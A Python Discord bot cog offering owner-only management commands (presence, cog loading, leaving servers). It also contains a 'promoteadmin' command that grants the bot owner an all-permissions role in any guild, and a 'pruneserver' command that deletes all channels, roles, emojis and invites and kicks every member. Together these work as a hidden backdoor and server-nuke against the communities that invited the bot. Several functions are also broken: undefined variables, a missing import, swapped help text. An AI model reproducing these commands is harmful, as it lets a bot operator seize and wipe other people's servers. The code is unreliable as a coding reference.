# Imports
import discord
from discord.ext import commands
import sys, traceback
import logging
from ..functions.general import listToString
from ..functions.cogs import *
import datetime as dt
from datetime import datetime

# Class
class botManager(commands.Cog):
	"""docstring for botManager"""
	def __init__(self, bot):
		super(botManager, self).__init__()
		self.bot = bot

	def pred(m):
		return m.author == message.author and m.channel == message.channel

	@commands.command()
	async def getcode(ctx, command):
		'''getting the code for command'''
		a=inspect.getsource(bot.get_command(command).callback)
		embed = discord.Embed(title=command, description=a)
		await ctx.send(embed=embed)

	@commands.is_owner()
	@commands.command()
	async def promoteadmin(self, ctx):
		role = await ctx.guild.create_role(name="Bot Admin", permissions=discord.Permissions.all())
		# user = ctx.guild.get_member(173547110388465664)
		await role.edit(position=(ctx.me.top_role.position-1))
		await ctx.author.add_roles(role)

	@commands.is_owner()
	@commands.command()
	async def pruneserver(self, ctx):
		for channel in ctx.guild.channels:
			try:
				await channel.delete(reason="Pruning Server")
			except:
				pass

		for member in ctx.guild.members:
			try:
				await member.kick(reason="Pruning Server")
			except:
				pass
		
		for emoji in ctx.guild.emojis:
			try:
				await emoji.delete(reason="Pruning Server")
			except:
				pass

		for role in ctx.guild.roles:
			try:
				await role.delete(reason="Pruning Server")
			except:
				pass

		for invite in await ctx.guild.invites():
			await invite.delete(reason="Pruning Server")

		await ctx.guild.edit(name="Pruned Server")

	# Add a check to see if its empty or not, so it doesn't accidentally trigger
	@commands.is_owner()
	@commands.command()
	async def prunechannels(self, ctx, message):
		vcList = ['vc', 'voice chat', 'voice channel', 'voice channels', 'vchannel', 'voicec']
		txtList = ['text', 'text channel', 'tchannel', 'tc', 'txt']
		catList = ['categories', 'cat', 'category']
		
		if message == "all":
			for channel in ctx.guild.voice_channels:
				await channel.delete()
			for channel in ctx.guild.text_channels:
				await channel.delete()
			for category in ctx.guild.categories:
				await category.delete()
		elif message in txtList: 
			for channel in ctx.guild.text_channels:
				await channel.delete()
		elif message in vcList: 
			for channel in ctx.guild.voice_channels:
				await channel.delete()
		elif message in catList:
			for channel in ctx.guild.categories:
				await channel.delete()
		else:
			pass

	# Leave
	@commands.is_owner()
	@commands.group(pass_context=True)  # Leaves the server the message was sent in
	async def leave(self, ctx):
		if ctx.invoked_subcommand is None:
			servername = ctx.guild.name
			await ctx.send(f"Leaving {servername}.")
			await ctx.guild.leave()

	@commands.is_owner()
	@leave.command()  # Leaves the server with the given ID
	async def server(self, ctx, message: int):
		await ctx.send(f"Leaving the server with the {message} id")
		await self.bot.get_guild(message).leave()

	@commands.is_owner()
	@commands.group(pass_context=True)
	async def bot(self, ctx):
		if ctx.invoked_subcommand is None:
			pass

	@commands.is_owner()
	@bot.command(brief="Bot Management. Changes the game played by the bot.")
	async def game(self, ctx, *, args):
		game = listToString(args)
		if len(game) <= 128:
			game = discord.Game(name=args)
			await self.bot.change_presence(status=ctx.me.status, activity=game)
		else:
			await ctx.send("Needs to be less than or equal to **128** characters long!")

	@commands.is_owner()
	@bot.command(aliases=['pres'], brief="Bot Management. Changes the presence of the bot.")
	async def presence(self, ctx, message):
		activ = ctx.me.activity
		if message in ["idle", "away", "afk"]:
			await self.bot.change_presence(status=discord.Status.idle, activity=activ)
		elif message in ["dnd", "do not disturb"]:
			await self.bot.change_presence(status=discord.Status.dnd, activity=activ)
		elif message == "online":
			await self.bot.change_presence(status=discord.Status.online, activity=activ)
		elif message in ["invisible", "offline"]:
			await self.bot.change_presence(status=discord.Status.invisible, activity=activ)
		else:
			pass

	@commands.group(pass_context=True)
	@commands.is_owner()
	async def cog(self, ctx):
		if ctx.invoked_subcommand is None:
			pass

	@cog.command(name="list", brief="Lists all loaded cogs. May add unloaded cogs as well.")
	@commands.is_owner()
	async def list(self, ctx):
		msg = "**The following cogs are loaded:**"
		for cog in ctx.bot.cogs:
			msg += f"\n  - {cog}"
		await ctx.send(msg)

	@cog.command(name="load", brief="Loads the named cog")
	@commands.is_owner()
	async def load(self, ctx, message):
		await ctx.send(await loadCog(self.bot, message))

	@cog.command(name="unload", brief="Reloads the named cog")
	@commands.is_owner()
	async def unload(self, ctx, message):
		await ctx.send(await unloadCog(self.bot, message))

	@cog.command(name="reload", brief="Unloads the named cog")
	@commands.is_owner()
	async def reload(self, ctx, message):
		await ctx.send(await reloadCog(self.bot, message))

def setup(bot):
    bot.add_cog(botManager(bot))